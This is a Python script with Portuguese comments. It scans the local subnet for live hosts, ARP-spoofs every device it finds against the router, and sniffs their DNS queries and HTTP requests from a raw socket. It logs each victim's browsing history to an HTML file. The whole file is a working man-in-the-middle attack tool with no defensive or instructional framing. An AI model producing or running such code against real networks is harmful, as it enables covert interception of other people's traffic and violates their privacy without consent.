import os
import socket
import struct
import threading
from datetime import datetime
from queue import Queue


def obter_ip_local():
    """Obtém o IP local do sistema."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))  # Conexão fictícia para descobrir o IP local
        endereco_ip = sock.getsockname()[0]
    finally:
        sock.close()
    return endereco_ip


def verificar_host(ip):
    """Verifica se um host está ativo usando ping."""
    try:
        retorno = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        return retorno == 0
    except Exception as erro:
        print(f"[!] Erro ao verificar host {ip}: {erro}")
        return False


def escanear_dispositivos(ip_local, max_threads=50):
    """Realiza a varredura de dispositivos ativos na sub-rede."""
    print("[*] Iniciando varredura na rede...")

    rede = ".".join(ip_local.split(".")[:3])
    fila_ips = Queue()
    for i in range(1, 255):
        fila_ips.put(f"{rede}.{i}")

    dispositivos_ativos = []

    def processo_verificacao():
        while not fila_ips.empty():
            ip_atual = fila_ips.get()
            if verificar_host(ip_atual):
                dispositivos_ativos.append(ip_atual)
            fila_ips.task_done()

    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=processo_verificacao)
        t.start()
        threads.append(t)

    fila_ips.join()
    for thread in threads:
        thread.join()

    # Salva os IPs reconhecidos no arquivo "ips_reconhecidos.txt"
    with open("ips_reconhecidos.txt", "w") as file:
        for ip in dispositivos_ativos:
            file.write(f"{ip}\n")
    print(f"[+] IPs ativos salvos em 'ips_reconhecidos.txt'")
    print(f"[*] Dispositivos ativos encontrados: {dispositivos_ativos}")
    return dispositivos_ativos


def executar_arp_spoof(interface, dispositivos, ip_local):
    """
    Realiza ARP Spoofing para todos os dispositivos detectados na rede.
    Cria threads para enviar pacotes de ARP entre o roteador e os dispositivos-alvo.
    """
    ip_roteador = f"{'.'.join(ip_local.split('.')[:3])}.1"
    print(f"[*] Iniciando ARP Spoofing para todos os dispositivos online na rede...")

    def spoof_loop(ip_origem, ip_destino):
        """Executa o comando arpspoof indefinidamente."""
        comando = f"sudo arpspoof -i {interface} -t {ip_origem} {ip_destino}"
        while True:
            os.system(f"{comando} > /dev/null 2>&1")

    threads = []
    for ip_alvo in dispositivos:
        if ip_alvo == ip_local:
            continue

        # Enviar spoofing do roteador para o dispositivo
        t1 = threading.Thread(target=spoof_loop, args=(ip_roteador, ip_alvo))
        t1.start()
        threads.append(t1)

        # Enviar spoofing do dispositivo para o roteador
        t2 = threading.Thread(target=spoof_loop, args=(ip_alvo, ip_roteador))
        t2.start()
        threads.append(t2)

    # Threads executam indefinidamente
    return threads


def extract_dns_query(data):
    """Extrai o domínio de uma consulta DNS."""
    try:
        domain = []
        i = 0
        length = data[i]
        while length != 0:
            i += 1
            domain.append(data[i:i + length].decode('utf-8'))
            i += length
            length = data[i]
        return '.'.join(domain)
    except Exception as e:
        print(f"[!] Erro ao extrair domínio DNS: {e}")
        return None


def capturar_pacotes(interface, html_file):
    """Captura pacotes HTTP, HTTPS e DNS, salvando as informações em um arquivo HTML."""
    try:
        raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
        raw_socket.bind((interface, 0))
        raw_socket.settimeout(1.0)

        print(f"[*] Iniciando captura na interface {interface}...")

        contador_http = 0
        dns_cache = set()  # Cache para evitar consultas DNS duplicadas

        with open(html_file, "w") as html:
            html.write("<html>\n<header>\n<title>Histórico de Navegação</title>\n</header>\n<body>\n<ul>\n")

        while True:
            try:
                pacote, _ = raw_socket.recvfrom(65535)

                eth_header = pacote[:14]
                eth_data = struct.unpack("!6s6sH", eth_header)

                if socket.ntohs(eth_data[2]) != 0x0800:  # Não é IPv4
                    continue

                ip_header = pacote[14:34]
                ip_data = struct.unpack("!BBHHHBBH4s4s", ip_header)
                protocolo = ip_data[6]
                ip_origem = socket.inet_ntoa(ip_data[8])

                # Captura de pacotes DNS
                if protocolo == 17:  # UDP
                    udp_header = pacote[34:42]
                    src_port, dest_port = struct.unpack("!HH", udp_header[:4])
                    if dest_port == 53:  # DNS
                        dns_data = pacote[42:]
                        domain = extract_dns_query(dns_data)
                        if domain and domain not in dns_cache:
                            dns_cache.add(domain)
                            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                            url = f"http://{domain}"
                            html.write(f"<li>{timestamp} - {ip_origem} -> DNS Query: <a href='{url}'>{domain}</a></li>\n")
                            print(f"[DNS] {ip_origem} -> {domain}")
                            html.flush()

                # Captura de pacotes HTTP/HTTPS
                if protocolo == 6:  # TCP
                    tcp_start = 34
                    tcp_header = pacote[tcp_start:tcp_start + 20]
                    tcp_data = struct.unpack("!HHLLBBHHH", tcp_header)
                    porta_origem = tcp_data[0]
                    porta_destino = tcp_data[1]

                    tcp_header_length = (tcp_data[4] >> 4) * 4
                    payload_start = tcp_start + tcp_header_length
                    payload = pacote[payload_start:]

                    try:
                        payload_text = payload.decode("utf-8", errors="replace")
                        if payload_text.startswith("GET") or payload_text.startswith("POST"):
                            contador_http += 1
                            linhas = payload_text.split("\r\n")
                            primeira_linha = linhas[0]
                            url_path = primeira_linha.split(" ")[1]
                            host = None

                            for linha in linhas:
                                if linha.lower().startswith("host:"):
                                    host = linha.split(":")[1].strip()
                                    break

                            if host:
                                url_completa = f"https://{host}" if porta_destino == 443 else f"http://{host}{url_path}"
                                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                html.write(f"<li>{timestamp} - {ip_origem} - <a href='{url_completa}'>{url_completa}</a></li>\n")
                                print(f"[HTTP/HTTPS] {ip_origem} -> {url_completa}")
                                html.flush()
                    except UnicodeDecodeError:
                        continue

            except socket.timeout:
                continue

    except KeyboardInterrupt:
        print("[!] Captura interrompida pelo usuário.")
    finally:
        with open(html_file, "a") as html:
            html.write("</ul>\n</body>\n</html>\n")
        raw_socket.close()


def limpar_tabela_arp():
    """Limpa a tabela ARP do sistema."""
    print("[*] Limpando a tabela ARP...")
    os.system("sudo ip -s -s neigh flush all")
    print("[+] Tabela ARP limpa.")


def main():
    try:
        ip_local = obter_ip_local()
        print(f"[+] IP local detectado: {ip_local}")

        interface = input("[*] Insira o nome da interface de rede (ex: eth0): ").strip()
        html_file = "historico_navegacao.html"

        dispositivos_ativos = escanear_dispositivos(ip_local)

        if not dispositivos_ativos:
            print("[!] Nenhum dispositivo ativo encontrado na rede.")
            return

        # Iniciar ARP Spoofing
        threading.Thread(target=executar_arp_spoof, args=(interface, dispositivos_ativos, ip_local), daemon=True).start()

        # Capturar pacotes
        capturar_pacotes(interface, html_file)

    except KeyboardInterrupt:
        print("\n[!] Programa interrompido pelo usuário.")
    finally:
        limpar_tabela_arp()


if __name__ == "__main__":
    main()
